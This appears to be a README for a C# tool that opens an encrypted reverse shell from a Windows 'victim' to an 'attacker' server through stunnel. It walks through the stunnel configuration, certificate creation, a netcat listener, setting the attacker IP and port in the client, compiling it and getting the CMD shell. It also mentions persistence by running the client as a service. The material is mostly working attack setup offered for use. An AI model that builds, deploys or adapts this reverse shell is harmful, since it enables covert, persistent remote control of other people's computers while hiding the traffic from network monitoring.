# STunnell_RevShell
A Reverse shell through Stunnel.
## Architecture
- Client Net4.8 C#
- Server Stunnell4

## Scenario:
Client is the victim, that executes the connection to the server (attacker) that serves stunnell.
Server is the attacker running stunnel4. Follows the configuration:
	
	cat /etc/stunnel/stunnel.conf 
	[nc]
	client = no
	accept = 9999
	connect = 127.0.0.1:6666
	cert = /etc/stunnel/lguerra.pem
	
	 
Here we set stunnel listening for incoming connection on port 9999. This connection is encrypted, then forwards the stream  to port 6666 where we will have nc listening. This flow is not encrypted of course.

## Create the certificate on the server
	
	openssl genrsa -out key.pem 2048
	openssl req -new -x509 -key key.pem -out cert.pem -days 1095
	cat key.pem cert.pem > /etc/stunnel/stunnel.pem
 
Start stunnell

	service stunnel4 start
	
Check if works:

	sudo service stunnel4 status
	● stunnel4.service - LSB: Start or stop stunnel 4.x (TLS tunnel for network daemons)
	     Loaded: loaded (/etc/init.d/stunnel4; generated)
	     Active: active (running) since Tue 2024-05-21 22:11:47 CEST; 5s ago
	       Docs: man:systemd-sysv-generator(8)
	    Process: 133285 ExecStart=/etc/init.d/stunnel4 start (code=exited, status=0/SUCCESS)
	      Tasks: 3 (limit: 9398)
	     Memory: 4.2M (peak: 4.6M)
	        CPU: 241ms
     	CGroup: /system.slice/stunnel4.service
             └─133301 /usr/bin/stunnel4 /etc/stunnel/stunnel.conf


Verify stunnell port is listening:	

    netstat -tulp | grep 9999
	  Active Internet connections (only servers)
	  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	  tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      19338/stunnel4
	  ...
	
Then we can lunch nc to listen on port 6666 as configurated on stunnel

	nc -lvp 6666
	
## Configure the client
Set the Stunnell server and port around line 50:

	//CONFIG THIS: point to the Stunell server
        string IP = "192.168.1.2";
        int PORT = 9999;
## TLS configuration
The client use TLS 1.3 (teseted on windows 11) to connect to the server:

	sslStream.AuthenticateAsClient("host.local", 
		new X509CertificateCollection(), 
		SslProtocols.Tls13, 
		false);

## Compile the client
Youn can compile the client as follows:

	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe STunnel_RevShell.cs
	
	
Executing Program.exe we should read the following on the shell

	ver 1.0 Coded by GuerraIT
	ver 1.1 Modified by Zinzloun (support TLS 1.3)
	
	Using the following connection 192.168.1.7:9999
	Certificate revocation list checked: False
	Remote cert was issued to CN=xxxxxx ......
The you shoud get a CMD shell on the attacker

## Missing server connection
### nc is not listening on the server
The client app continues to send requests to the server, you will see on the console the certificate info looping:
	
 	...
	Certificate revocation list checked: False
	Remote cert was issued to CN=xxxx....
	Certificate revocation list checked: False
	Remote cert was issued to CN=xxxx....
 	Certificate revocation list checked: False
	Remote cert was issued to CN=xxxx....
	...
At soon as the nc listener is started on the server the client will connect immediately, stopping to print the certificate information and you should get the shell.
## Stunnell is not listening on the server
In this case the client will keep to try to connect to the server. You won't get the certificate information printed in this case:

	...
	Using the following connection 192.168.1.7:9999
As soon as sconnect will start the app will connect to the server, switching to the previous state (looping certificate info printend on the screen). If nc listener is also started you will get a shell

## Persistence
You can use the app as a service

## Trouble shooting on Kali
If you get the following error re-starting stunnel:

	sudo service stunnel4 status
	...
 	Active: failed (Result: exit-code) since Tue 2024-05-21 22:04:54 CEST; 2min 21s ago
  	stunnel4.service: Failed with result 'exit-code'.
	stunnel4.service: Unit process 52254 (stunnel4) remains running after unit stopped.

It seems a bug on Debian related to the PID file, to solve try to manually kill the related process 

 	sudo kill -9 52254

Then restart the service

		

